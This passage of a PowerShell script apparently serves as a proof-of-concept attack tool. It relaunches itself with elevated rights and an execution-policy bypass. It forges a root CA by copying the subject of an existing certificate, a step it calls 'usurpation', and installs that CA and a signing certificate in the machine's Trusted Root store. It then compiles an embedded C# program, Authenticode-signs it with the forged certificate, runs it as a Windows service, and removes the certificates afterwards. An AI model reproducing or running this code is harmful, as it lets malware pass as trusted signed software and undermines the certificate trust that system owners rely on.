	# 3 = XCN_CRYPT_STRING_BASE64REQUESTHEADER (-----BEGIN NEW CERTIFICATE REQUEST----- + Base64)
	# 4 = XCN_CRYPT_STRING_HEX (Hex encoded)
	# Source: https://msdn.microsoft.com/en-us/library/windows/desktop/aa374936(v=vs.85).aspx
	$iEncoding = 0;
	if ($ExportForm){
		if (($ExportForm -ge 1) -and ($ExportForm -le 4)){
			$iEncoding = $ExportForm;
		}
	}
	#
	# Generate the cert
	$sCertB64 = $oEnroll.CreateRequest($iEncoding);  # Output the request in base64
	#
	# Install the Certificate to the Store in :
	# - cert:LocalMachine\My
	# - cert:LocalMachine\CA
	# - cert:CurrentUser\CA
	# Restrictions:
  # - AllowNone                  = 0
  # - AllowNoOutstandingRequest  = 1
  # - AllowUntrustedCertificate  = 2
  # - AllowUntrustedRoot         = 4
  $iRestrictions = 4;
	# Certificate Encoding :
	#  - same as previous "Export format/encoding :"
	# and already defined !
	#$iEncoding
	# Password to protect the certificate:
	$sInstallPassword = "";
	# Installation
	$oEnroll.InstallResponse($iRestrictions, $sCertB64, $iEncoding, $sInstallPassword);
	#
	return $sCertB64;
}
#
################################
# Add a X509 Certificate to a Store
################################
function X509InstallCert{
   <#
        .SYNOPSIS
        Add a X509 Certificate to a Store
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER RootStore
        RootStore as String, can be "LocalMachine" or "CurrentUser"
        
        .PARAMETER CertStore
        CertStore as String, can be "Root" or "My"
        RootStore and CertStore combination correspond of the path cert:\LocalMachine\Root
        
        .PARAMETER B64Certificate
        Certificate as a Base64 String, without Base64 headers (XCN_CRYPT_STRING_BASE64HEADER)
        During certificate creation, must use ExportForm=XCN_CRYPT_STRING_BASE64
    #>
	param(
		[Parameter(Mandatory=$true)]
		[String]
		$StoreName,
		
		[Parameter(Mandatory=$true)]
		[String]
		$StoreLocation,
		
		[Parameter(Mandatory=$true)]
		[String]
		$B64Certificate
	)
	#
	# Convert our Base64 encoded Certificate to X509Certificate object
	$oCert = Base64ToX509 -Base64Certificate $B64Certificate;
	#
	# Create a X509 Store object to store our certificate
	# Source: https://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.x509store(v=vs.110).aspx
	$oStore = New-Object System.Security.Cryptography.X509Certificates.X509Store($StoreName,$StoreLocation);
	#
	# Open it with Write flag right
	# For write, flag can be "MaxAllowed" or "ReadWrite"
	# Source: https://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.openflags(v=vs.110).aspx
	$oStore.open("MaxAllowed"); #ReadWrite
	#
	# Last but not least, add our Root CA
	$oStore.add($oCert);
	$oStore.close();
}
#
################################
# Find a X509 Certificate and can delete it
################################
function X509CertificateFind{
   <#
        .SYNOPSIS
        Search for certificate and delete if requested
        
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER Subject
        Subject of the certificate as String
        
        .PARAMETER Delete
        Delete if found as a boolean.
        Values:
				0 = Do not delete
				1 = Delete
    #>
	param(
		[Parameter(Mandatory=$true)]
		[String]
		$Subject,
		
		[Boolean]
		$Delete
	)
	#
	# Use main locations
	# Source: https://msdn.microsoft.com/en-us/library/aa347693.aspx
	$aStoreLocations=@('LocalMachine', 'CurrentUser');
	$aStoreNames=@('Root', 'Trust', 'CA', 'My', 'trustedpublisher');	
	#
	# List and search
	foreach ($sLocation in $aStoreLocations){
		foreach ($sName in $aStoreNames){
			$oStore = New-Object system.security.cryptography.X509Certificates.X509Store($sName,$sLocation);
			# Proper way to open ;-)
			if ($Delete){
				$oStore.Open("ReadWrite");
			} else {
				$oStore.Open("ReadOnly");
			}
			# Foreach one, check if it's our certificate
			foreach ($oCert in $oStore.Certificates){
				if ($oCert.Subject -like $Subject){
					if ($Delete){
						$oStore.remove($oCert);
						write-host "   $sLocation\$sName, delete: " $oCert.subject;
					} else {
						write-host "   $sLocation\$sName, found: " $oCert.subject;
					}
				}
			}
			$oStore.close();
		}
	}
}
#
################################
# Check if the current process has admin rights
################################
function isElevated{
   <#
        .SYNOPSIS
        Check if the current process has admin rights
        Returns True if admin,  False if not
    #>
	param(
	)
	#
	# Get information about the current identity and privileges
	$oCurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
	#
	# Convert to Principal
	$oCurrentPrincipal = ([Security.Principal.WindowsPrincipal] $oCurrentIdentity);
	#
	# Admin role
	$oAdmin = ([Security.Principal.WindowsBuiltInRole] "Administrator");
	#
	# Return admin state : True or False
	return $oCurrentPrincipal.IsInRole($oAdmin);
}
#
################################
# Show messages
################################
function ColorShow{
   <#
        .SYNOPSIS
        Write-host with color :-D
        Colors: Black | DarkBlue | DarkGreen | DarkCyan | DarkRed | DarkMagenta |
        				DarkYellow | Gray | DarkGray | Blue | Green | Cyan | Red | Magenta |
        				Yellow | White
        				
        Author: Mynameisv_
        License: Do what the fuck you want to public license
        
        .PARAMETER Msg
        Message as a string
				
        .PARAMETER Level
        0 = default
        1 = Menu
        2 = action
        3 = result
        4 = information
        5 = alert
        Default is 0

    #>
	param(
		[Parameter(Mandatory=$true)]
		[String]
		$Msg,
		
		[int32]
		$Level=0
	)
	switch ($Level){
		0 {
			# Default color
			$sMsg = ""+$Msg;
			$sColor = "DarkGray";
		}
		1 {
			# Main menu
			$sMsg = " [*] "+$Msg;
			$sColor = "DarkBlue";
		}
		2 {
			# Action
			$sMsg = " [+] "+$Msg;
			$sColor = "Blue";
		}
		3 {
			# Result
			$sMsg = "   [>] "+$Msg;
			$sColor = "Green";
		}
		4 {
			# Information
			$sMsg = "   [i] "+$Msg;
			$sColor = "Gray";
		}
		5 {
			# Alert
			$sMsg = " [!] "+$Msg;
			$sColor = "Red";
		}
	}
	write-host -foregroundcolor $sColor $sMsg;
}

#
##
###
################################################################
## Main / Entrypoint
################################
#
# Hello  \o
write-host "`n" $global:sScriptName "$iVersionMajor.$iVersionMinor /" $global:sAuthor;
write-host "License: Do what the fuck you want to public license`n";
#
################################
# Check privileges and elevate
################################
# Need to be elevated, are we ?
ColorShow -Level 1 -Msg "Checking privileges";

$bState = isElevated;
#
# Get current script path
$sScriptPath = [string]$MyInvocation.InvocationName;
#
#	
if (!$bState){
	ColorShow -Level 5 -Msg "No admin rights, need to elevate.";
	#
	# Get current directory
	#$sScriptDir = $ExecutionContext.sessionstate.Path.CurrentLocation.Path;
	# Build argumentlist
	$sArgumentList = "-ex bypass -f ";
	$sArgumentList+= $sScriptPath;
	#
	# UAC-gently Ask to elevate
	ColorShow -Level 2 -Msg "Running script with UAC...";
	Start-Process powershell -ArgumentList $sArgumentList -verb RunAs
	ColorShow -Level 4 -Msg "End of non-privilege script execution."
	#
	# Dirty way to exit, better would be if/else but that way is shorter ;-)
	exit;
}	
#
# Here, we are elevated
ColorShow -Level 4 -Msg "Welcome on the elevated script execution.";
#
################################
# CA generation and adding in Root
################################
# Cert subject generation
ColorShow -Level 2 -Msg "CA Subject usurpation";
$aCertSubject = GetCertInformations -Magic 1;
$sNewSubject = ChangeCertificateSubject -Subject $aCertSubject[0];
$Msg = "Cert Subject`n";
$Msg+= "Original Subject:{"+$aCertSubject[0]+"}`n";
$Msg+= "     New Subject:{"+$sNewSubject+"}`n";
$Msg+= "          Issuer:{"+$aCertSubject[3]+"}`n";
$Msg+= "        Friendly:{"+$aCertSubject[4]+"}`n";
$Msg+= "       NotBefore:{"+$aCertSubject[1]+"}`n";
$Msg+= "        NotAfter:{"+$aCertSubject[2]+"}`n";
ColorShow -Level 3 -Msg $Msg
#
# Key generation
ColorShow -Level 2 -Msg "CA Key generation...";
$oCAKey = X509KeyCreate -KeySize 2048 -KeySpec 2;
if ($oCAKey -eq $False){
	ColorShow -Level 5 "Error in Key generation.";
	exit;
}
 else {
	ColorShow -Level 3 -Msg "Key ok";
}
#
# CA certificate creation
$sCASubject = $sNewSubject;
$sCAIssuer = $aCertSubject[3];
$sCAFriendly = $aCertSubject[4];
ColorShow -Level 2 -Msg "CA Certificate creation and installation in Cert:LocalMachine\My and Cert:LocalMachine\CA";
$sCACertB64 = X509CertCreate -oKey $oCAKey -Hash "SHA256" -Subject $sCASubject -Issuer $sCAIssuer -FriendlyName $sCAFriendly -ExportForm 1 -CACert $True;
#
#[io.file]::WriteAllBytes("certCA.crt", [System.Text.Encoding]::UTF8.GetBytes($sCACertB64));
#
# Check
ColorShow -Level 2 -Msg "Checking...";
X509CertificateFind -Subject $sCASubject;
#
# CA certificate installation
$StoreName = "Root";
$StoreLocation = "LocalMachine";
ColorShow -Level 2 -Msg "CA Certificate installation in Trusted Root Certification Authorities ($StoreLocation \ $StoreName)";
X509InstallCert -StoreName $StoreName -StoreLocation $StoreLocation -B64Certificate $sCACertB64;
#
# Check
ColorShow -Level 2 -Msg "Checking..."
X509CertificateFind -Subject $sCASubject;
#
################################
# Signing certificate generation and adding in Root
################################
#
# Key generation
ColorShow -Level 2 -Msg "Signing certificate Key generation";
$oSignKey = X509KeyCreate -KeySize 2048 -KeySpec 1;
if ($oSignKey -eq $False){
	ColorShow -Level 5 "Error in Key generation.";
	exit;
}
 else {
	ColorShow -Level 3 -Msg "Key ok";
}
#
# Signing certificate creation
$sNewSubject = ChangeCertificateSubject -Subject $sCASubject;
$sSignSubject = $sNewSubject;
$sSignIssuer = $sCAIssuer;
#$sSignFriendly = "ssssss";
$oCACert = Base64ToX509 -Base64Certificate $sCACertB64;
ColorShow -Level 2 -Msg "Signing certificate creation and injection in Cert:LocalMachine\My and Cer:LocalMachine\CA";
$sSignCertB64 = X509CertCreate -oKey $oSignKey -Hash "SHA256" -Issuer $sSignIssuer -Subject $sSignSubject -ExportForm 1 -CACert $False -CAObject $oCACert;
#
#[io.file]::WriteAllBytes("certSign.crt", [System.Text.Encoding]::UTF8.GetBytes($sSignCertB64));
#
# Check
ColorShow -Level 2 -Msg "Checking...";
X509CertificateFind -Subject $sSignSubject;
#
# Signing certificate installation
$StoreName = "Root";
$StoreLocation = "LocalMachine";
ColorShow -Level 2 -Msg "Signing Certificate installation in Trusted Root Certification Authorities ($StoreLocation \ $StoreName)";
X509InstallCert -StoreName $StoreName -StoreLocation $StoreLocation -B64Certificate $sSignCertB64;
#
# Check
ColorShow -Level 2 -Msg "Checking..."
X509CertificateFind -Subject $sSignSubject;
#
################################
# Auto-compilation
################################
#
# Get Script directory
$sScriptPath = [string]$MyInvocation.InvocationName;
$sScriptName = [string]$MyInvocation.MyCommand;
$iPos = $sScriptPath.LastIndexOf("\"); #"
$sScriptDir = $sScriptPath.SubString(0, $iPos+1);
#
# C# compilation to realease a Windows Service binary
ColorShow -Level 2 -Msg "Auto-compilation of the service C# code";
$sBinary = $sScriptDir;
$sBinary+= $sServiceExeName;
Add-Type -TypeDefinition $sServiceSourceCode -Language CSharp -OutputAssembly $sBinary -OutputType ConsoleApplication -ReferencedAssemblies "System.ServiceProcess", "System.Management" -Debug:$false
#
ColorShow -Level 3 -Msg "Done as $sBinary";
#
################################
# Auto-sign
################################
#
# Get Script directory
ColorShow -Level 2 -Msg "Auto-sign the compiled service";
$oSignCert = Base64ToX509 -Base64Certificate $sSignCertB64;
Set-AuthenticodeSignature -Certificate $oSignCert -TimeStampServer 'http://timestamp.verisign.com/scripts/timstamp.dll' -FilePath $sBinary;
#
ColorShow -Level 3 -Msg "Done";
#
################################
# Running the service
################################
#
# Creation/Installation
ColorShow -Level 2 -Msg "Service creation"
$sCmd = "sc.exe"
$sArgumentList = "create $sServiceName binpath= $sBinary error= ignore type= own start= auto displayname= $sServiceName";
ColorShow -Level 4 -Msg $sArgumentList;
Start-Process $sCmd -ArgumentList $sArgumentList;
ColorShow -Level 3 -Msg "Done";
ColorShow -Level 4 -Msg "Sleeping...";
for ($i=6;$i -gt 0;$i--){
	write-host "$i " -NoNewline;
	Start-Sleep -s 1;
}	
#
# Start
ColorShow -Level 2 -Msg "Service start"
$sCmd = "sc.exe"
$sArgumentList = "start $sServiceName";
ColorShow -Level 4 -Msg $sArgumentList;
Start-Process $sCmd -ArgumentList $sArgumentList;
ColorShow -Level 3 -Msg "Done";
ColorShow -Level 4 -Msg "Sleeping...";
for ($i=6;$i -gt 0;$i--){
	write-host "$i " -NoNewline;
	Start-Sleep -s 1;
}	
#
# Checking
ColorShow -Level 2 -Msg "Service state"
$sCmd = "sc.exe"
$sArgumentList = "query $sServiceName";
ColorShow -Level 4 -Msg $sArgumentList;
Start-Process $sCmd -ArgumentList $sArgumentList;
ColorShow -Level 3 -Msg "Done";
ColorShow -Level 4 -Msg "Sleeping...";
for ($i=6;$i -gt 0;$i--){
	write-host "$i " -NoNewline;
	Start-Sleep -s 1;
}	
#
# Stop
ColorShow -Level 2 -Msg "Service stop"
$sCmd = "sc.exe"
$sArgumentList = "stop $sServiceName";
ColorShow -Level 4 -Msg $sArgumentList;
Start-Process $sCmd -ArgumentList $sArgumentList;
ColorShow -Level 3 -Msg "Done";
ColorShow -Level 4 -Msg "Sleeping...";
for ($i=6;$i -gt 0;$i--){
	write-host "$i " -NoNewline;
	Start-Sleep -s 1;
}
#
# Remove
ColorShow -Level 2 -Msg "Service remove"
$sCmd = "sc.exe"
$sArgumentList = "delete $sServiceName";
ColorShow -Level 4 -Msg $sArgumentList;
Start-Process $sCmd -ArgumentList $sArgumentList;
ColorShow -Level 3 -Msg "Done";
ColorShow -Level 4 -Msg "Sleeping...";
for ($i=6;$i -gt 0;$i--){
	write-host "$i " -NoNewline;
	Start-Sleep -s 1;
}
#
################################
# Cleaning
################################
#
# Remove the certificates
ColorShow -Level 2 -Msg "Cleaning Signing certificate"
X509CertificateFind -Delete $True -Subject $sSignSubject;
#
ColorShow -Level 2 -Msg "Cleaning CA certificate"
X509CertificateFind -Delete $True -Subject $sCASubject;

ColorShow -Level 4 -Msg "Sleeping...";
for ($i=20;$i -gt 0;$i--){
	write-host "$i " -NoNewline;
	Start-Sleep -s 1;
}
